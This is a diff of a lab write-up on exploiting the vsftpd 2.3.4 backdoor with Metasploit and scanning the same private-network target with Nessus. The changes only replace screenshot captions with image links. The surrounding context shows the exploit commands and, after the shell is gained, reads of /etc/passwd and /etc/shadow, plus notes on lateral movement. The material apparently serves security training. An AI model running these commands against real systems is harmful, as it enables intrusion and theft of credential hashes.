@@ -20,7 +20,7 @@ In July 2011, the master source archive for vsftpd 2.3.4 was altered to include 
 
 #### Stage 1: Module Configuration
 
-**Screenshots: 2026-05-20 215243.png through 215346.png**
+**![Exploit Configuration](images/2026-05-20-215243.png)**
 
 ```
 msf> use exploit/unix/ftp/vsftpd_234_backdoor
@@ -33,7 +33,7 @@ msf> set rhosts 192.168.122.108
 
 #### Stage 2: Parameter Verification
 
-**Screenshot: 2026-05-20 220544.jpg**
+**![Parameter Verification](images/2026-05-20-220544.jpg)**
 
 ```
 msf> show options
@@ -45,7 +45,7 @@ msf> show options
 
 #### Stage 3: Exploit Injection & Shell Extraction
 
-**Screenshots: 2026-05-20 215400.png, 215452.png, 215504.png, 215514.png**
+**![Exploit Injection](images/2026-05-20-215400.png)**
 
 ```
 msf> exploit
@@ -68,7 +68,7 @@ target
 
 #### System Account Database Extraction
 
-**Screenshot: 2026-05-20 215536.jpg**
+**![Passwd Extraction](images/2026-05-20-215536.jpg)**
 
 ```bash
 cat /etc/passwd
@@ -84,7 +84,7 @@ cat /etc/passwd
 
 #### Cryptographic Hash Database Extraction
 
-**Screenshot: 2026-05-20 215550.jpg**
+**![Shadow Extraction](images/2026-05-20-215550.jpg)**
 
 ```bash
 cat /etc/shadow
@@ -98,7 +98,7 @@ cat /etc/shadow
 
 #### Multi-Command Access Continuity
 
-**Screenshot: 2026-05-20 215737.png**
+**![Session Stability](images/2026-05-20-215737.png)**
 
 ```bash
 whoami && hostname
@@ -108,7 +108,7 @@ whoami && hostname
 
 #### Network Routing Verification
 
-**Screenshot: 2026-05-20 215902.png**
+**![Network Routing](images/2026-05-20-215902.png)**
 
 ```bash
 ping 192.168.122.71
@@ -118,7 +118,7 @@ ping 192.168.122.71
 
 #### Lateral Asset Footprinting
 
-**Screenshots: 2026-05-20 220744.png through 223554.jpg**
+**![Lateral Movement Analysis](images/2026-05-20-220744.png)**
 
 **Actions Performed**:
 - Profiling processes across secondary systems
@@ -136,7 +136,7 @@ To compare targeted manual testing with automated auditing, the Tenable Nessus E
 
 #### Package Extraction
 
-**Screenshot: 2026-05-21 202131.jpg**
+**![Nessus Installation](images/2026-05-21-202131.jpg)**
 
 ```bash
 sudo dpkg -i Nessus.deb
@@ -150,11 +150,11 @@ sudo dpkg -i Nessus.deb
 
 #### Dependency Resolution
 
-**Screenshot: 2026-05-20 220309.png**
+**![Dependency Error](images/2026-05-20-220309.png)**
 - Initial package manager directory tracking path error
 - Missing binary path due to terminal session initialized outside Downloads stack
 
-**Screenshot: 2026-05-20 220410.png & 220524.png**
+**![Path Remediation](images/2026-05-20-220410.png)**
 
 ```bash
 cd Downloads/
@@ -168,7 +168,7 @@ sudo dpkg -i Nessus.deb
 
 #### GUI Database Initialization
 
-**Screenshot: 2026-05-21 203718.png**
+**![Nessus Web Interface](images/2026-05-21-203718.png)**
 
 ```
 https://192.168.122.148:8834/
@@ -178,7 +178,7 @@ https://192.168.122.148:8834/
 
 #### Air-Gapped Offline Licensing
 
-**Screenshot: 2026-05-21 203904.png**
+**![Licensing Portal](images/2026-05-21-203904.png)**
 
 **Challenge**: Bypassing isolated network blocks by feeding registration engine a challenge string
 
@@ -192,7 +192,7 @@ nessuscli fetch --challenge
 
 #### Target Scope Restriction
 
-**Screenshot: 2026-05-21 205443.png**
+**![Scope Definition](images/2026-05-21-205443.png)**
 
 ```
 Target: 192.168.122.108
@@ -202,7 +202,7 @@ Target: 192.168.122.108
 
 #### Real-Time Vulnerability Processing
 
-**Screenshots: 2026-05-21 205402.png and 205917.png**
+**![Scan Progress](images/2026-05-21-205402.png)**
 
 **Status**: Tracking live vulnerability discoveries at early completion stages
 
@@ -210,7 +210,7 @@ Target: 192.168.122.108
 
 #### Live Severity Finding Index
 
-**Screenshot: 2026-05-21 210009.jpg**
+**![Vulnerability Results](images/2026-05-21-210009.jpg)**
 
 **Prioritized Vulnerabilities**:
 | Vulnerability | CVSS Score | Status |
@@ -227,7 +227,7 @@ Two separate assessment sweeps were executed against the target machine to evalu
 
 ### Multi-Scan Tracking Panel
 
-**Screenshot: 2026-05-21 210419.png**
+**![Multi-Scan Tracking](images/2026-05-21-210419.png)**
 
 **Configuration**: Side-by-side execution monitoring tracking:
 - Common Ports profile (concurrent)
@@ -235,7 +235,7 @@ Two separate assessment sweeps were executed against the target machine to evalu
 
 ### Common Ports Policy Results
 
-**Screenshot: 2026-05-21 210736.jpg**
+**![Common Ports Results](images/2026-05-21-210736.jpg)**
 
 | Metric | Value |
 |--------|-------|
@@ -250,7 +250,7 @@ Two separate assessment sweeps were executed against the target machine to evalu
 
 ### All Ports Policy Results
 
-**Screenshot: 2026-05-21 215434.jpg**
+**![All Ports Results](images/2026-05-21-215434.jpg)**
 
 | Metric | Value | Change |
 |--------|-------|--------|
